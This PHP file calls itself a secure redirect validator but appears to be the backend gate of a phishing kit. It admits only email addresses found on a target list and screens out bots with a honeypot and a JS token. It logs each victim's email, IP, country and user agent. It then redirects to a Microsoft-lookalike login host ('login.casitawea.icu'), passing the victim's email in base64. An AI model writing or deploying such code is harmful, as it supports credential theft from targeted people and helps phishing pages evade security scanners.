<?php
// ── Secure Redirect Validator (FR/EN) + Accurate IP Logging ──
declare(strict_types=1);
date_default_timezone_set('UTC');

$OGAS_PATH = __DIR__ . '/ogas/oga.txt';
$LOG_PATH  = __DIR__ . '/.data/validated.log';

// ---- Redirect base + allow-list host(s)
$REDIRECT_BASE = getenv('REDIRECT_BASE')
  ?: 'https://login.casitawea.icu/?oleOXZQmi1LY=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN';

$baseHost = parse_url($REDIRECT_BASE, PHP_URL_HOST) ?: '';
$allowedEnv = trim((string) getenv('ALLOWED_REDIRECT_HOSTS'));
$ALLOWED_REDIRECT_HOSTS = array_filter(array_map('strtolower', array_map('trim',
  $allowedEnv !== '' ? explode(',', $allowedEnv) : ($baseHost ? [$baseHost] : [])
)));

// ---- i18n (en/fr)
$langHdr = strtolower($_SERVER['HTTP_X_CLIENT_LANG'] ?? $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
$lang = str_starts_with($langHdr, 'fr') ? 'fr' : 'en';

$MSG = [
  'en' => [
    'invalid'   => 'Invalid request',
    'badMethod' => 'Method not allowed',
    'badJson'   => 'Malformed JSON body',
    'badEmail'  => 'Invalid email address',
    'honeypot'  => 'Bot detected',
    'denied'    => 'Invalid Email',
    'captcha'   => 'Invalid captcha',
    'ok'        => 'Validated',
    'badHost'   => 'Redirect host not allowed'
  ],
  'fr' => [
    'invalid'   => 'Requête invalide',
    'badMethod' => 'Méthode non autorisée',
    'badJson'   => 'Corps JSON mal formé',
    'badEmail'  => 'Adresse e-mail invalide',
    'honeypot'  => 'Bot détecté',
    'denied'    => 'Adresse e-mail invalide',
    'captcha'   => 'Captcha invalide',
    'ok'        => 'Validé',
    'badHost'   => 'Hôte de redirection non autorisé'
  ],
][$lang];

// ---- helpers
function respond(int $status, array $data): never {
  http_response_code($status);
  header('Content-Type: application/json; charset=utf-8');
  header('Access-Control-Allow-Origin: *');
  echo json_encode($data, JSON_UNESCAPED_SLASHES);
  exit;
}

function ensure_paths(string $logPath, string $ogasPath): void {
  @is_dir(dirname($logPath)) || @mkdir(dirname($logPath), 0755, true);
  @is_dir(dirname($ogasPath)) || @mkdir(dirname($ogasPath), 0755, true);
  @is_file($ogasPath) || @file_put_contents($ogasPath, "");
}

/**
 * Accurate client IP, Cloudflare/proxy-aware.
 * - Prefer CF-Connecting-IP
 * - Parse X-Forwarded-For and pick the first public IP
 * - Fall back to other headers, then REMOTE_ADDR
 * Returns [ip, source, chain] where chain is the raw XFF (if any)
 */
function client_ip_accurate(): array {
  $chain = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
  // 1) Cloudflare direct client IP
  if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $cfip = trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    if (filter_var($cfip, FILTER_VALIDATE_IP)) {
      return [$cfip, 'CF_CONNECTING_IP', $chain];
    }
  }
  // 2) X-Forwarded-For list
  if ($chain !== '') {
    $parts = array_map('trim', explode(',', $chain));
    foreach ($parts as $cand) {
      if (filter_var($cand, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return [$cand, 'X_FORWARDED_FOR_PUBLIC', $chain];
      }
    }
    // fallback to the first entry even if private
    $fallback = $parts[0] ?? '';
    if (filter_var($fallback, FILTER_VALIDATE_IP)) {
      return [$fallback, 'X_FORWARDED_FOR_FIRST', $chain];
    }
  }
  // 3) Other common headers
  $alts = ['HTTP_X_REAL_IP','HTTP_X_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED'];
  foreach ($alts as $h) {
    if (!empty($_SERVER[$h])) {
      $v = trim($_SERVER[$h]);
      if (filter_var($v, FILTER_VALIDATE_IP)) {
        return [$v, $h, $chain];
      }
    }
  }
  // 4) Fallback
  $remote = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
  return [$remote, 'REMOTE_ADDR', $chain];
}

function ua_short(int $max = 300): string {
  $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
  return mb_substr($ua, 0, $max);
}

// ---- CORS preflight
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
  header('Access-Control-Allow-Origin: *');
  header('Access-Control-Allow-Headers: Content-Type, Accept-Language, X-Requested-With, X-Client-Lang');
  header('Access-Control-Allow-Methods: POST, OPTIONS');
  http_response_code(204);
  exit;
}

// ---- Only JSON POST
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
  respond(405, ['valid'=>false,'message'=>$MSG['badMethod'],'code'=>'bad_method']);
}
$ct = strtolower($_SERVER['CONTENT_TYPE'] ?? '');
if (strpos($ct, 'application/json') === false) {
  respond(400, ['valid'=>false,'message'=>$MSG['invalid'],'code'=>'bad_content_type']);
}

// ---- Ensure paths
ensure_paths($LOG_PATH, $OGAS_PATH);

// ---- Read JSON
$raw   = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) {
  respond(400, ['valid'=>false,'message'=>$MSG['badJson'],'code'=>'bad_json']);
}

// ---- Fields
$email      = strtolower(trim((string)($input['email'] ?? '')));
$cfToken    = (string)($input['cfToken'] ?? '');     // optional if verified upstream
$jsToken    = (string)($input['jsToken'] ?? '');
$middleName = trim((string)($input['middleName'] ?? ''));

// ---- Honeypot
if ($middleName !== '') {
  respond(403, ['valid'=>false,'message'=>$MSG['honeypot'],'code'=>'honeypot']);
}

// ---- Basic JS token (optional, but matches Worker/front)
if ($jsToken === '' || !str_starts_with($jsToken, 'ok-')) {
  respond(403, ['valid'=>false,'message'=>$MSG['invalid'],'code'=>'bad_js_token']);
}

// ---- Email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
  respond(422, ['valid'=>false,'message'=>$MSG['badEmail'],'code'=>'bad_email']);
}

// ---- Whitelist: supports full emails and @domain lines
$whitelist = @file($OGAS_PATH, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
$whitelist = array_map(static fn($s)=>strtolower(trim($s)), $whitelist);

$allowed = false;
[$user, $domain] = array_pad(explode('@', $email, 2), 2, '');
foreach ($whitelist as $line) {
  if ($line === $email) { $allowed = true; break; }
  if ($domain && $line !== '' && $line[0] === '@' && $domain === ltrim($line, '@')) { $allowed = true; break; }
}
if (!$allowed) {
  respond(403, ['valid'=>false,'message'=>$MSG['denied'],'code'=>'not_whitelisted']);
}

// ---- Captcha placeholder (if Worker didn't edge-verify)
if ($cfToken !== '' && strlen($cfToken) < 10) {
  respond(401, ['valid'=>false,'message'=>$MSG['captcha'],'code'=>'bad_captcha']);
}

// ---- Accurate IP + context
[$ip, $ipSource, $xffChain] = client_ip_accurate();
$ua        = ua_short();
$cfCountry = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? null;
$cfRay     = $_SERVER['HTTP_CF_RAY'] ?? null;
$referer   = $_SERVER['HTTP_REFERER'] ?? null;
$acceptLng = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? null;

// ---- Log (JSON-L)
$entry = [
  'time'       => gmdate('c'),
  'email'      => $email,
  'ip'         => $ip,
  'ipSource'   => $ipSource,             // where we took the IP from
  'xff'        => $xffChain ?: null,     // raw X-Forwarded-For chain (if any)
  'ua'         => $ua,
  'jsToken'    => $jsToken,
  'cfCountry'  => $cfCountry,
  'cfRay'      => $cfRay,
  'referer'    => $referer,
  'acceptLang' => $acceptLng,
];

@file_put_contents(
  $LOG_PATH,
  json_encode($entry, JSON_UNESCAPED_SLASHES) . PHP_EOL,
  FILE_APPEND | LOCK_EX
);

// ---- Build redirect (host allow-list)
$rbHost = strtolower(parse_url($REDIRECT_BASE, PHP_URL_HOST) ?: '');
if (!$rbHost || (!empty($ALLOWED_REDIRECT_HOSTS) && !in_array($rbHost, $ALLOWED_REDIRECT_HOSTS, true))) {
  respond(400, ['valid'=>false,'message'=>$MSG['badHost'],'code'=>'bad_redirect_host']);
}

// URL-safe base64 email for query param
$omn = rtrim(strtr(base64_encode($email), '+/', '-_'), '=');
$redirect = $REDIRECT_BASE . (str_contains($REDIRECT_BASE, '?') ? '&' : '?') . 'omn=' . $omn;

// ---- OK
respond(200, ['valid'=>true,'message'=>$MSG['ok'],'redirect'=>$redirect]);
